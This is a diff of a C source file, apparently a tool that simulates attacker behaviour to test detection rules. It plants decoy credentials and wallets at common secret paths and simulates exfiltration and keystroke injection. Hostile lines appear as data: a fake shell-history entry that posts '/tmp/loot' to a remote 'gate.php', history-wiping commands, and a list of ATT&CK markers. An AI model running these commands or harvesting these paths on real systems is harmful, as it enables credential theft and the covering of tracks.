@@ -107,7 +107,7 @@ static void remove_empty_parents(const char *path, const char *stop)
 }
 
 // Contents are obvious decoys: the AWS pair is the public documentation
-// example and every other value contains ANTINOMIE-DEMO. `in_home` marks the
+// example and every other value contains DEMO-DECOY. `in_home` marks the
 // ones --cred-home may place below $HOME; the others only ever go in the work directory.
 static const struct {
     const char *relative;
@@ -121,18 +121,18 @@ static const struct {
      1},
     {".ssh/id_rsa",
      "-----BEGIN OPENSSH PRIVATE KEY-----\n"
-     "ANTINOMIE-DEMO-0000000000000000000000000000000000000000000000000000\n"
+     "DEMO-DECOY-0000000000000000000000000000000000000000000000000000\n"
      "-----END OPENSSH PRIVATE KEY-----\n",
      1},
-    {".git-credentials", "https://demo:ghp_ANTINOMIEDEMO0000000000000000000000@github.com\n", 1},
+    {".git-credentials", "https://demo:ghp_DEMODECOY00000000000000000000000000@github.com\n", 1},
     {".config/google-chrome/Default/Login Data",
      "SQLite format 3\n"
-     "ANTINOMIE-DEMO-COOKIE-DB\n"
+     "DEMO-DECOY-COOKIE-DB\n"
      "https://example.invalid\0demo\0hunter2-demo\n",
      1},
     {".mozilla/firefox/demo.default/logins.json",
      "{\"logins\":[{\"hostname\":\"https://example.invalid\",\"username\":\"demo\","
-     "\"password\":\"ANTINOMIE-DEMO\"}]}\n",
+     "\"password\":\"DEMO-DECOY\"}]}\n",
      1},
     {".bash_history",
      "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot\n"
@@ -140,14 +140,14 @@ static const struct {
      "history -c\n",
      1},
     {".zsh_history", ": 1700000000:0;ssh admin@198.51.100.23\n", 0},
-    {".kube/config", "apiVersion: v1\nclusters: []\n# ANTINOMIE-DEMO\n", 1},
-    {".netrc", "machine example.invalid login demo password ANTINOMIE-DEMO\n", 1},
-    {".config/gcloud/credentials.db", "SQLite format 3\nANTINOMIE-DEMO-GCLOUD\n", 1},
-    {".bitcoin/wallet.dat", "ANTINOMIE-DEMO wallet placeholder, not a wallet\n", 1},
-    {".electrum/wallets/default_wallet", "{\"ANTINOMIE-DEMO\":true}\n", 1},
-    {"krb5.keytab", "ANTINOMIE-DEMO keytab placeholder\n", 0},
-    {"var/run/secrets/kubernetes.io/serviceaccount/token", "ANTINOMIE-DEMO.service.account.token\n", 0},
-    {".ssh/known_hosts", "10.0.2.2 ssh-ed25519 AAAAANTINOMIEDEMO\n", 0},
+    {".kube/config", "apiVersion: v1\nclusters: []\n# DEMO-DECOY\n", 1},
+    {".netrc", "machine example.invalid login demo password DEMO-DECOY\n", 1},
+    {".config/gcloud/credentials.db", "SQLite format 3\nDEMO-DECOY-GCLOUD\n", 1},
+    {".bitcoin/wallet.dat", "DEMO-DECOY wallet placeholder, not a wallet\n", 1},
+    {".electrum/wallets/default_wallet", "{\"DEMO-DECOY\":true}\n", 1},
+    {"krb5.keytab", "DEMO-DECOY keytab placeholder\n", 0},
+    {"var/run/secrets/kubernetes.io/serviceaccount/token", "DEMO-DECOY.service.account.token\n", 0},
+    {".ssh/known_hosts", "10.0.2.2 ssh-ed25519 AAAADEMODECOY\n", 0},
 };
 #define DECOY_COUNT (sizeof decoys / sizeof decoys[0])
 
@@ -273,7 +273,7 @@ SCENARIO(exfil_sim)
     // A decoy key in a credentials-class path, sent with sendfile(2) straight to a socket.
     if (sample_path(directory, sizeof directory, options->workdir, ".ssh") == 0 &&
         sample_mkdir_p(directory) == 0 && sample_path(decoy, sizeof decoy, directory, "id_exfil") == 0 &&
-        sample_write_text(decoy, "ANTINOMIE-DEMO decoy key material for the exfiltration shape\n") == 0) {
+        sample_write_text(decoy, "DEMO-DECOY decoy key material for the exfiltration shape\n") == 0) {
         int file = open(decoy, O_RDONLY | O_CLOEXEC);
         struct stat info;
         if (file >= 0 && fstat(file, &info) == 0) {
@@ -346,7 +346,7 @@ SCENARIO(collection_sim)
     // TIOCSTI pushes keystrokes into a terminal; on a regular file it is ENOTTY.
     if (sample_path(directory, sizeof directory, options->workdir, "docs") == 0 &&
         sample_mkdir_p(directory) == 0 && sample_path(path, sizeof path, directory, "inject.txt") == 0 &&
-        sample_write_text(path, "ANTINOMIE-DEMO\n") == 0) {
+        sample_write_text(path, "DEMO-DECOY\n") == 0) {
         int fd = open(path, O_RDONLY | O_CLOEXEC);
         if (fd >= 0) {
             char key = 'x';
@@ -364,7 +364,7 @@ SCENARIO(collection_sim)
         snprintf(leaf, sizeof leaf, "report%02d.txt", i);
         unsigned char buffer[64];
         if (sample_path(path, sizeof path, directory, leaf) == 0 &&
-            sample_write_text(path, "ANTINOMIE-DEMO document\n") == 0 &&
+            sample_write_text(path, "DEMO-DECOY document\n") == 0 &&
             read_file(path, buffer, sizeof buffer) > 0)
             swept++;
     }
@@ -380,8 +380,8 @@ SCENARIO(collection_sim)
 // ---- rule-markers ----------------------------------------------------------------------
 
 static const char *markers[] = {
-    "ANTINOMIE_BEHAVIOR_SAMPLE_v2",
-    "ANTINOMIE_CRED_DECOY",
+    "DEMO_BEHAVIOR_SAMPLE_v2",
+    "DEMO_CRED_DECOY",
     "T1059.004",  "T1105",     "T1055",     "T1071.001", "T1048.003",
     "T1552.001",  "T1053.003", "T1547.001", "T1620",     "T1014",
     "attack.execution", "attack.persistence", "attack.defense-evasion",
@@ -396,7 +396,7 @@ static const char *markers[] = {
     "ptrace(PTRACE_TRACEME)",
     "/dev/shm/.cache",
     "crontab -l",
-    "systemctl --user enable antinomie-demo",
+    "systemctl --user enable demo-sample",
     "history -c",
     "rm -rf ~/.bash_history",
 };
